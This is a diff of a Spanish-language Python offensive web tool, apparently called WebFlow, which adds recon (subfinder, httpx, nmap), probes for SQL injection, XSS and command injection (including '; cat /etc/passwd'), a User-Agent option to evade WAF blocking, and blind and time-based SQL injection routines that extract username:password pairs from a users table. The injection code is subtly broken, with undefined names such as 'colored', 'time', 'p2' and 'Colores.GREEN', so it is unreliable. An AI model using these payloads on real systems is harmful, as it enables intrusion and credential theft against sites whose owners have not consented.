@@ -1,40 +1,45 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
+import os
+import subprocess
 import requests
 from lxml import html
 from urllib.parse import urlparse
 from tqdm import tqdm
-from requests.packages.urllib3.util.retry import Retry
-from requests.adapters import HTTPAdapter
-from colorama import Fore, Style
+from string import printable
+from time import sleep
+import sys
 
 # Definición de colores
 class Colores:
-    VERDE = Fore.GREEN
-    ROJO = Fore.RED
-    AMARILLO = Fore.YELLOW
-    RESET = Style.RESET_ALL
+    VERDE = "\033[92m"
+    ROJO = "\033[91m"
+    AMARILLO = "\033[93m"
+    CYAN = "\033[96m"
+    AZUL = "\033[94m"
+    RESET = "\033[0m"
 
 def imprimir_banner():
     """Imprime un banner de bienvenida."""
     banner = r"""
-    __________________________________/\\\_______________/\\\\\__/\\\\\\____________________________________        
-    __________________________________\/\\\_____________/\\\///__\////\\\____________________________________       
-     __________________________________\/\\\____________/\\\_________\/\\\____________________________________      
-      __/\\____/\\___/\\_____/\\\\\\\\__\/\\\_________/\\\\\\\\\______\/\\\________/\\\\\_____/\\____/\\___/\\_     
-       _\/\\\__/\\\\_/\\\___/\\\/////\\\_\/\\\\\\\\\__\////\\\//_______\/\\\______/\\\///\\\__\/\\\__/\\\\_/\\\_    
-        _\//\\\/\\\\\/\\\___/\\\\\\\\\\\__\/\\\////\\\____\/\\\_________\/\\\_____/\\\__\//\\\_\//\\\/\\\\\/\\\__   
-         __\//\\\\\/\\\\\___\//\\///////___\/\\\__\/\\\____\/\\\_________\/\\\____\//\\\__/\\\___\//\\\\\/\\\\\___  
-          ___\//\\\\//\\\_____\//\\\\\\\\\\_\/\\\\\\\\\_____\/\\\_______/\\\\\\\\\__\///\\\\\/_____\//\\\\//\\\____ 
-           ____\///__\///_______\//////////__\/////////______\///_______\/////////_____\/////________\///__\///_____                                                                                   
+██╗    ██╗███████╗██████╗ ███████╗██╗      ██████╗ ██╗    ██╗
+██║    ██║██╔════╝██╔══██╗██╔════╝██║     ██╔═══██╗██║    ██║
+██║ █╗ ██║█████╗  ██████╔╝█████╗  ██║     ██║   ██║██║ █╗ ██║
+██║███╗██║██╔══╝  ██╔══██╗██╔══╝  ██║     ██║   ██║██║███╗██║
+╚███╔███╔╝███████╗██████╔╝██║     ███████╗╚██████╔╝╚███╔███╔╝
+ ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝ 
+                                                                                                           
                                      by TheOffSecGirl
     """
     print(Colores.VERDE + banner + Colores.RESET)
 
 def validar_url(url):
     """Valida que la URL sea correcta."""
-    result = urlparse(url)
-    return bool(result.scheme and result.netloc)
+    try:
+        result = urlparse(url)
+        return all([result.scheme, result.netloc])
+    except ValueError:
+        return False
 
 def verificar_csrf(formulario):
     """Verifica si hay un token CSRF en el formulario."""
@@ -44,13 +49,14 @@ def verificar_csrf(formulario):
     else:
         print(Colores.VERDE + "✅ Token CSRF encontrado." + Colores.RESET)
 
-def verificar_inyeccion_sql_avanzado(url):
+def verificar_inyeccion_sql(url, user_agent=None):
     """Verifica inyección SQL enviando payloads comunes."""
     payloads = ["' OR 1=1--", "' OR 'a'='a", "' OR 1=1#", "' AND 1=1--"]
+    headers = {'User-Agent': user_agent} if user_agent else {}
     vulnerable = False
-    for payload in tqdm(payloads, desc="Verificando SQL Injection"):
+    for payload in payloads:
         try:
-            response = requests.get(f"{url}{payload}", timeout=10)
+            response = requests.get(f"{url}{payload}", headers=headers, timeout=10)
             if "SQL" in response.text or "syntax" in response.text:
                 print(Colores.AMARILLO + f"⚠️ Posible vulnerabilidad de inyección SQL con el payload: {payload}" + Colores.RESET)
                 vulnerable = True
@@ -59,11 +65,12 @@ def verificar_inyeccion_sql_avanzado(url):
     if not vulnerable:
         print(Colores.VERDE + "✅ No se detectaron inyecciones SQL." + Colores.RESET)
 
-def verificar_xss_avanzado(url):
+def verificar_xss(url, user_agent=None):
     """Verifica vulnerabilidades XSS enviando payloads comunes."""
     payload = "<script>alert('XSS')</script>"
+    headers = {'User-Agent': user_agent} if user_agent else {}
     try:
-        response = requests.get(url, params={"q": payload}, timeout=10)
+        response = requests.get(url, params={"q": payload}, headers=headers, timeout=10)
         if payload in response.text:
             print(Colores.AMARILLO + "⚠️ Posible vulnerabilidad de Cross-Site Scripting (XSS) reflejado." + Colores.RESET)
         else:
@@ -71,13 +78,14 @@ def verificar_xss_avanzado(url):
     except requests.RequestException as e:
         print(Colores.ROJO + f"❌ Error al verificar XSS avanzado: {e}" + Colores.RESET)
 
-def verificar_inyeccion_comando(url):
+def verificar_inyeccion_comando(url, user_agent=None):
     """Verifica inyección de comandos enviando payloads comunes."""
     payloads = ["; ls", "; cat /etc/passwd"]
+    headers = {'User-Agent': user_agent} if user_agent else {}
     vulnerable = False
-    for payload in tqdm(payloads, desc="Verificando Inyección de Comandos"):
+    for payload in payloads:
         try:
-            response = requests.get(f"{url}{payload}", timeout=10)
+            response = requests.get(f"{url}{payload}", headers=headers, timeout=10)
             if "root:" in response.text:
                 print(Colores.AMARILLO + f"⚠️ Posible vulnerabilidad de inyección de comandos con el payload: {payload}" + Colores.RESET)
                 vulnerable = True
@@ -86,10 +94,11 @@ def verificar_inyeccion_comando(url):
     if not vulnerable:
         print(Colores.VERDE + "✅ No se detectaron inyecciones de comandos." + Colores.RESET)
 
-def verificar_encabezados_http(url):
+def verificar_encabezados_http(url, user_agent=None):
     """Verifica la seguridad de los encabezados HTTP."""
+    headers = {'User-Agent': user_agent} if user_agent else {}
     try:
-        response = requests.get(url, timeout=10)
+        response = requests.get(url, headers=headers, timeout=10)
         if "X-Content-Type-Options" not in response.headers:
             print(Colores.AMARILLO + "⚠️ Falta encabezado X-Content-Type-Options" + Colores.RESET)
         if "X-XSS-Protection" not in response.headers:
@@ -104,20 +113,15 @@ def verificar_encabezados_http(url):
     except requests.RequestException as e:
         print(Colores.ROJO + f"❌ Error al verificar encabezados HTTP: {e}" + Colores.RESET)
 
-def escanear_vulnerabilidades(url, opciones, modo):
+def escanear_vulnerabilidades(url, opciones, user_agent=None):
     """Escanea la URL en busca de las vulnerabilidades seleccionadas."""
     if not validar_url(url):
         print(Colores.ROJO + "❌ URL inválida. Por favor, ingrese una URL válida." + Colores.RESET)
         return
 
-    session = requests.Session()
-    retries = Retry(total=5, backoff_factor=1, status_forcelist=[ 500, 502, 503, 504 ])
-    session.mount('http://', HTTPAdapter(max_retries=retries))
-    session.mount('https://', HTTPAdapter(max_retries=retries))
-    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
-
     try:
-        response = session.get(url, timeout=10)
+        headers = {'User-Agent': user_agent} if user_agent else {}
+        response = requests.get(url, headers=headers, timeout=10)
         response.raise_for_status()  # Lanza un error si la solicitud no fue exitosa
         root = html.fromstring(response.content)
 
@@ -127,65 +131,193 @@ def escanear_vulnerabilidades(url, opciones, modo):
             if 'csrf' in opciones:
                 verificar_csrf(formulario)
         if 'sql' in opciones:
-            verificar_inyeccion_sql_avanzado(url)
+            verificar_inyeccion_sql(url, user_agent)
         if 'xss' in opciones:
-            verificar_xss_avanzado(url)
+            verificar_xss(url, user_agent)
         if 'comando' in opciones:
-            verificar_inyeccion_comando(url)
+            verificar_inyeccion_comando(url, user_agent)
         if 'encabezados' in opciones:
-            verificar_encabezados_http(url)
+            verificar_encabezados_http(url, user_agent)
 
     except requests.RequestException as e:
         print(Colores.ROJO + f"❌ Error al escanear la URL: {e}" + Colores.RESET)
 
+def main_url_input():
+    return input(Colores.AZUL + "Ingrese la URL principal para realizar el ataque: " + Colores.RESET).strip()
+
+def user_agent_input():
+    return input(Colores.AZUL + "Ingrese el User-Agent a utilizar (deje vacío para usar el predeterminado): " + Colores.RESET).strip()
+
+def configure_headers(user_agent):
+    return {"User-Agent": user_agent if user_agent else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
+
+def makeSQLI(main_url, headers):
+    p1 = Progress("Fuerza bruta")
+    p1.status("Iniciando proceso de fuerza bruta...")
+
+    for position in tqdm(range(1, 150), desc="Fuerza bruta"):
+        for character in range(33, 126):
+            sqli_url = f"{main_url}?id=0 or (select(select ascii(substring(select group_concat(username,0x3a,password) from users), {position},1)) from users where id = 1)={character}"
+            p1.status(colored(sqli_url, Colores.GREEN))
+            
+            try:
+                r = requests.get(sqli_url, headers=headers)
+            except requests.exceptions.RequestException as e:
+                print(colored(f"[!] Error en la solicitud: {e}", Colores.RED))
+                sys.exit(1)
+            
+            if r.status_code == 200:  
+                extracted_info += chr(character)
+                p2.status(colored(extracted_info, Colores.BLUE))
+                break
+
+def makeTimeBasedSQLI(main_url, headers):
+    p1 = Progress("Fuerza bruta")
+    p1.status("Iniciando proceso de fuerza bruta...")
+
+    for position in tqdm(range(1, 150), desc="Fuerza bruta"):
+        for character in range(33, 126):
+            sqli_url = f"{main_url}?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users), {position},1))={character}, sleep(0.35), 1)"
+            p1.status(colored(sqli_url, Colores.GREEN))
+
+            time_start = time.time()
+
+            try:
+                r = requests.get(sqli_url, headers=headers)
+            except requests.exceptions.RequestException as e:
+                print(colored(f"[!] Error en la solicitud: {e}", Colores.RED))
+                sys.exit(1)
+
+            time_end = time.time()
+
+            if time_end - time_start > 0.35:  
+                extracted_info += chr(character)
+                p2.status(colored(extracted_info, Colores.BLUE))
+                break
+
+class Progress:
+    def __init__(self, task_name):
+        self.task_name = task_name
+        print(colored(f"[+] {self.task_name} iniciado...", Colores.GREEN))
+
+    def status(self, message):
+        print(colored(f"[*] {self.task_name}: {message}", Colores.CYAN))
+
+def sql_injection_menu(main_url, headers):
+    print(Colores.AZUL + "\nSeleccione el tipo de SQLi:" + Colores.RESET)
+    print(Colores.CYAN + "1. Conditional SQLi" + Colores.RESET)
+    print(Colores.CYAN + "2. Time-Based SQLi" + Colores.RESET)
+    choice = input(Colores.AZUL + "Ingrese su elección (1 o 2): " + Colores.RESET).strip()
+
+    if choice == "1":
+        makeSQLI(main_url, headers)
+    elif choice == "2":
+        makeTimeBasedSQLI(main_url, headers)
+    else:
+        print(Colores.ROJO + "[!] Opción no válida." + Colores.RESET)
+
+def reconocimiento_dominio(dominio, user_agent=None):
+    print(Colores.AZUL + f"[*] Iniciando reconocimiento de subdominios para {dominio}" + Colores.RESET)
+    subfinder_cmd = f"subfinder -d {dominio} -silent -o subdomains.txt"
+    httpx_cmd = f"httpx -l subdomains.txt -silent -o active_subdomains.txt"
+
+    if user_agent:
+        subfinder_cmd += f" --header 'User-Agent: {user_agent}'"
+        httpx_cmd += f" --header 'User-Agent: {user_agent}'"
+
+    try:
+        subprocess.run(subfinder_cmd, shell=True, check=True)
+        print(Colores.VERDE + "[+] Subfinder completado. Subdominios guardados en subdomains.txt" + Colores.RESET)
+        subprocess.run(httpx_cmd, shell=True, check=True)
+        print(Colores.VERDE + "[+] HTTPX completado. Subdominios activos guardados en active_subdomains.txt" + Colores.RESET)
+    except subprocess.CalledProcessError as e:
+        print(Colores.ROJO + f"❌ Error en el reconocimiento de subdominios: {e}" + Colores.RESET)
+
+def escaneo_puertos():
+    print(Colores.AZUL + "[*] Iniciando escaneo de puertos en subdominios activos" + Colores.RESET)
+
+    # Verificar si el archivo contiene subdominios
+    if os.path.isfile("active_subdomains.txt") and os.path.getsize("active_subdomains.txt") > 0:
+        nmap_cmd = "nmap -iL active_subdomains.txt -T4 -F -oN nmap_scan.txt"
+        try:
+            subprocess.run(nmap_cmd, shell=True, check=True)
+            print(Colores.VERDE + "[+] Escaneo de puertos completado. Resultados guardados en nmap_scan.txt" + Colores.RESET)
+        except subprocess.CalledProcessError as e:
+            print(Colores.ROJO + f"❌ Error en el escaneo de puertos: {e}" + Colores.RESET)
+    else:
+        print(Colores.ROJO + "❌ No se encontraron subdominios activos para escanear." + Colores.RESET)
+
 if __name__ == "__main__":
     imprimir_banner()  # Imprime el banner al inicio
-    try:
-        url_a_escanear = input("Ingrese la URL a escanear: ")
-        while not validar_url(url_a_escanear):
-            print(Colores.ROJO + "❌ URL inválida. Por favor, ingrese una URL válida." + Colores.RESET)
-            url_a_escanear = input("Ingrese la URL a escanear: ")
 
-        print("Seleccione las vulnerabilidades a comprobar:")
-        print("1. CSRF")
-        print("2. Inyección SQL")
-        print("3. XSS")
-        print("4. Inyección de Comandos")
-        print("5. Encabezados HTTP")
-        print("6. Todas")
+    while True:
+        print(Colores.AZUL + "\nSeleccione la tarea que desea realizar:" + Colores.RESET)
+        print(Colores.CYAN + "1. Análisis de vulnerabilidades en URL" + Colores.RESET)
+        print(Colores.CYAN + "2. Reconocimiento de subdominios" + Colores.RESET)
+        print(Colores.CYAN + "3. Escaneo de puertos" + Colores.RESET)
+        print(Colores.CYAN + "4. Todas las anteriores" + Colores.RESET)
+        print(Colores.CYAN + "5. SQL Injection" + Colores.RESET)
+        print(Colores.CYAN + "6. Salir" + Colores.RESET)
 
-        seleccion = input("Ingrese el número de la opción: ")
+        tarea = input(Colores.AZUL + "Ingrese el número de la opción: " + Colores.RESET)
 
-        opciones_seleccionadas = []
-        if seleccion == '1':
-            opciones_seleccionadas.append('csrf')
-        elif seleccion == '2':
-            opciones_seleccionadas.append('sql')
-        elif seleccion == '3':
-            opciones_seleccionadas.append('xss')
-        elif seleccion == '4':
-            opciones_seleccionadas.append('comando')
-        elif seleccion == '5':
-            opciones_seleccionadas.append('encabezados')
-        elif seleccion == '6':
-            opciones_seleccionadas = ['csrf', 'sql', 'xss', 'comando', 'encabezados']
+        # Preguntar si desea usar un User-Agent personalizado
+        usar_agente = input(Colores.AZUL + "¿Deseas añadir un User-Agent personalizado para evitar bloqueos del WAF? (y/n): " + Colores.RESET)
+        user_agent = None
+        if usar_agente.lower() == 'y':
+            user_agent = input(Colores.AZUL + "Introduce el User-Agent que deseas usar: " + Colores.RESET)
+
+        if tarea == '1':
+            url_a_escanear = input(Colores.AZUL + "Ingrese la URL a escanear: " + Colores.RESET)
+            print(Colores.AZUL + "Seleccione las vulnerabilidades a comprobar:" + Colores.RESET)
+            print(Colores.CYAN + "1. CSRF" + Colores.RESET)
+            print(Colores.CYAN + "2. Inyección SQL" + Colores.RESET)
+            print(Colores.CYAN + "3. XSS" + Colores.RESET)
+            print(Colores.CYAN + "4. Inyección de Comandos" + Colores.RESET)
+            print(Colores.CYAN + "5. Encabezados HTTP" + Colores.RESET)
+            print(Colores.CYAN + "6. Todas" + Colores.RESET)
+
+            seleccion = input(Colores.AZUL + "Ingrese el número de la opción: " + Colores.RESET)
+
+            opciones_seleccionadas = []
+            if seleccion == '1':
+                opciones_seleccionadas.append('csrf')
+            elif seleccion == '2':
+                opciones_seleccionadas.append('sql')
+            elif seleccion == '3':
+                opciones_seleccionadas.append('xss')
+            elif seleccion == '4':
+                opciones_seleccionadas.append('comando')
+            elif seleccion == '5':
+                opciones_seleccionadas.append('encabezados')
+            elif seleccion == '6':
+                opciones_seleccionadas = ['csrf', 'sql', 'xss', 'comando', 'encabezados']
+            else:
+                print(Colores.ROJO + "[!] Opción no válida." + Colores.RESET)
+                continue
+
+            escanear_vulnerabilidades(url_a_escanear, opciones_seleccionadas, user_agent)
+
+        elif tarea == '2':
+            dominio = input(Colores.AZUL + "Ingrese el dominio para el reconocimiento: " + Colores.RESET)
+            reconocimiento_dominio(dominio, user_agent)
+
+        elif tarea == '3':
+            escaneo_puertos()
+
+        elif tarea == '4':
+            dominio = input(Colores.AZUL + "Ingrese el dominio para el reconocimiento y escaneo: " + Colores.RESET)
+            reconocimiento_dominio(dominio, user_agent)
+            escaneo_puertos()
+
+        elif tarea == '5':
+            main_url = main_url_input()
+            headers = configure_headers(user_agent)
+            sql_injection_menu(main_url, headers)
+
+        elif tarea == '6':
+            print(Colores.VERDE + "\n[✓] ¡Hasta luego!" + Colores.RESET)
+            break
+
         else:
-            print(Colores.ROJO + "❌ Opción no válida. Saliendo." + Colores.RESET)
-            exit()
-
-        print("Seleccione el modo de escaneo:")
-        print("1. Activo")
-        print("2. Pasivo")
-        modo = input("Ingrese el número de la opción: ")
-
-        if modo == '1':
-            modo = 'activo'
-        elif modo == '2':
-            modo = 'pasivo'
-        else:
-            print(Colores.ROJO + "❌ Opción no válida. Saliendo." + Colores.RESET)
-            exit()
-
-        escanear_vulnerabilidades(url_a_escanear, opciones_seleccionadas, modo)
-    except KeyboardInterrupt:
-        print(Colores.ROJO + "❌ Escaneo interrumpido por el usuario." + Colores.RESET)
+            print(Colores.ROJO + "[!] Opción no válida." + Colores.RESET)
